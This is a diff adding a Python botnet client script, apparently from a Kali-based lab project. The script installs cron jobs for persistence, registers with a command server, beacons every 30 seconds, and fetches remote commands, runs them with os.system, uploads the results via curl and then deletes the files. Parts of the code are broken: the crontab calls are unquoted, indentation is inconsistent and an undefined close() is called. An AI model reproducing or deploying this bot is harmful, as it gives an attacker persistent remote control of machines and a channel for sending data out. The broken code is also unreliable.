@@ -1,0 +1,68 @@
+#!/usr/bin/env python3
+
+import sys
+import os
+import requests
+from datetime import datetime
+import time
+
+##checking to see if directory exists and making directory on new machine
+def cronjobs():
+    os.system((crontab -l 2>/dev/null; echo "0 12 * * * /root/readerv1.py >/dev/null 2>&1") | crontab -)
+    os.system((crontab -l 2>/dev/null; echo "*/60 * * * * /root/readerv1.py beacon >/dev/null 2>&1")| crontab -)
+    os.system((crontab -l 2>/dev/null; echo "* * * * * /root/readerv1.py instructions >/dev/null 2>&1")| crontab -)
+
+def directoryhandler():
+	dir = os.path.join('./','.bot')
+	if not os.path.exists(dir):
+		os.mkdir(dir)
+		os.chdir(dir)
+		f = open('name.txt', 'w+')
+		f.write('')
+		f.close()
+	else:
+		os.chdir(dir)
+def namecheck():
+	botnames = requests.get('http://10.0.2.15:8080/botnames.txt')
+	data = botnames.text.strip().split()
+	lastbot = data[-1]
+	with open('name.txt', 'r+') as f:
+		if f not in data:
+			myname = str(int(lastbot)+1)
+			f.write(myname)
+			request = 'curl -d '+myname+' http://10.0.2.15:8080/log.txt'
+			os.system(request)
+		else:
+			close()
+def beacon():
+	myname = open('name.txt', 'r')
+	x = datetime.now()
+	current_time = x.strftime("%H:%M:%S")
+	data = current_time+' Online '+myname.read()
+	request = 'curl -d "'+data+'" http://10.0.2.15:8080/log.txt'
+	starttime = time.time()
+	while True:
+		os.system(request)
+		time.sleep(30 - ((time.time() - starttime) % 30))
+
+def instructions():
+    os.system('curl 192.168.56.102:8080/instructions.txt | cut -d "\'" -f2 > response.txt')
+    with open('/home/kali/project/webserver/response.txt') as input_file:
+        contents = input_file.read()
+        os.system(contents)
+        os.system('curl -d @/home/kali/project/webserver/sendthis.txt 192.168.56.102:8080/instructions.txt')
+        os.system('rm /home/kali/project/webserver/sendthis.txt /home/kali/project/webserver/response.txt')
+
+
+
+
+
+if __name__ == '__main__':
+	if len(sys.argv) == 1:
+        directoryhandler()
+        namecheck()
+        cronjobs()
+    elif sys.argv[1] == 'beacon':
+        beacon()
+    elif sys.argv[1] == 'instructions':
+        instructions()
